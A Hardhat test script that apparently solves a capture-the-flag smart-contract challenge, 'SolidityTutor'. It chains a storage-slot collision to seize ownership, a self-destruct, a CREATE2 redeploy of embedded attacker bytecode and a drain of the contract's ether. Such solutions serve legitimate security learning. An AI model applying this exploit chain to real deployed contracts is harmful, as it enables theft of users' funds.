import { expect } from "chai";
import { BigNumber, Contract, ContractFactory, providers, Signer } from "ethers";
import { ethers } from "hardhat";

describe("SolidityTutor", function () {
    let signer: Signer;
    let player: string;
    let challengeFactory: ContractFactory;
    let challenge: Contract;

    // Set the challenge instance to the address returned when deploying the challenge.
    let challenge_instance_address = "0x1856B4C3E47F524e24B6a886698b8090b5B4Bfa6";
    before(async () => {
        [signer] = await ethers.getSigners();
        player = await signer.getAddress();
        console.log("Primary Signer Address:", player);

        // comment the next two lines if running locally 
        //challengeFactory = await ethers.getContractFactory("SolidityTutor");
        //challenge = challengeFactory.attach(challenge_instance_address);

        // uncomment if running locally:
        challengeFactory = await ethers.getContractFactory("SolidityTutor");
        challenge = await challengeFactory.deploy() /**put your constructor args here*/;
        await challenge.deployed();
    });

    it("Should solve the challenge", async () => {
        let b = await ethers.provider.getBalance(challenge.address);
        console.log("Starting balance:", BigNumber.from(b).toString());
        const currentOwner = await challenge.owner();
        
        try {
            const resetTx = await challenge.resetToInitialTutorial(
                { value: ethers.utils.parseEther("0.001"), gasLimit: 5000000 }
                );
                const resetReceipt = await resetTx.wait();
                console.log("Tutorial reset complete, now attacking storage slot clash vulnerability to change owner:");
        } catch (e) {
                console.log(e);
                console.error("Error during challenge.resetToInitialTutorial()");
                process.exit();
        }

        const currentTutorialContract = await challenge.currentTutorialContract();
        console.log("Starting Owner: ", currentOwner);
        console.log("Computed CREATE2 Contract address", currentTutorialContract);
        
        // Deploying helper contract:
        const helperFactory = await ethers.getContractFactory("SolidityTutorHelper");
        const helper = await helperFactory.deploy();
        await helper.deployed();
        
        console.log("Helper contract deployed at:", helper.address);

        // Attacking storage slot collision vulnerability:
        try {
            const changeOwnerTx = await helper.changeOwner(player, challenge.address, { gasLimit: 500000 });
            const changeOwnerReceipt = await changeOwnerTx.wait();
            const owner = await challenge.owner();
            console.log("New owner is player?", owner == player);
            console.log("Proceeding to deletion of initial contract through GoodByeWorld()");
        } catch (e) {
            console.log("Error during changeOwner()");
            process.exit();
        }
        
        try { 
            const goodbyeWorldTx = await helper.killTutorial(currentTutorialContract, { gasLimit: 500000 });
            const goodbyeWorldReceipt = await goodbyeWorldTx.wait();
            console.log("GoodbyeWorld succeeded, now attempting to override tutorial contract");
        } catch (e) {
            console.log("Error during GoodByeWorldTx");
            process.exit();
        }

        const salt = 133742069; // This can be found by debugging the resetToInitialTutorial() transaction.

        const attacker_bytecode = "0x608060405234801561001057600080fd5b50610228806100206000396000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c806312065fe01461004657806353ce9e3914610064578063d018db3e14610082575b600080fd5b61004e61009e565b60405161005b9190610113565b60405180910390f35b61006c6100a6565b6040516100799190610147565b60405180910390f35b61009c600480360381019061009791906101c5565b6100b0565b005b600047905090565b6000610539905090565b8073ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f193505050501580156100f6573d6000803e3d6000fd5b5050565b6000819050919050565b61010d816100fa565b82525050565b60006020820190506101286000830184610104565b92915050565b6000819050919050565b6101418161012e565b82525050565b600060208201905061015c6000830184610138565b92915050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061019282610167565b9050919050565b6101a281610187565b81146101ad57600080fd5b50565b6000813590506101bf81610199565b92915050565b6000602082840312156101db576101da610162565b5b60006101e9848285016101b0565b9150509291505056fea2646970667358221220cfd7b7fd7a5bf58fbb39cfc5c5a7ceced7430732ebd34b2d9d5ce527b805a97b64736f6c634300080d0033";

        try { 
            const changeTutorialTx = await challenge.changeTutorial(salt, attacker_bytecode, 
                { gasLimit: 5000000 }
            );
            const changeTutorialReceipt = await changeTutorialTx.wait();
            console.log("Tutorial changed, now attempting final attack to steal ether");
        } catch (e) {
            console.log("Error at changeTutorialTx");
            process.exit();
        }

        const attackerFactory = await ethers.getContractFactory("SolidityTutorAttacker");
        const attacker = attackerFactory.attach(currentTutorialContract);
        const sanity = await attacker.sanity();
        console.log(BigNumber.from(sanity).toString());
        try { 
            const attackTx = await helper.attack(player, challenge.address);
            const attackReceipt = await attackTx.wait();
            console.log("Attack complete, now checking if solved...");
        } catch (e) {
            console.error("Error at helper.attack()");
            process.exit();
        }
        
        const balance = await ethers.provider.getBalance(challenge.address);
        console.log("address balance:", BigNumber.from(balance).toString());
        const solved = await challenge.isSolved();
        console.log("Solved?", solved);
        expect(solved).to.be.true;
    });
});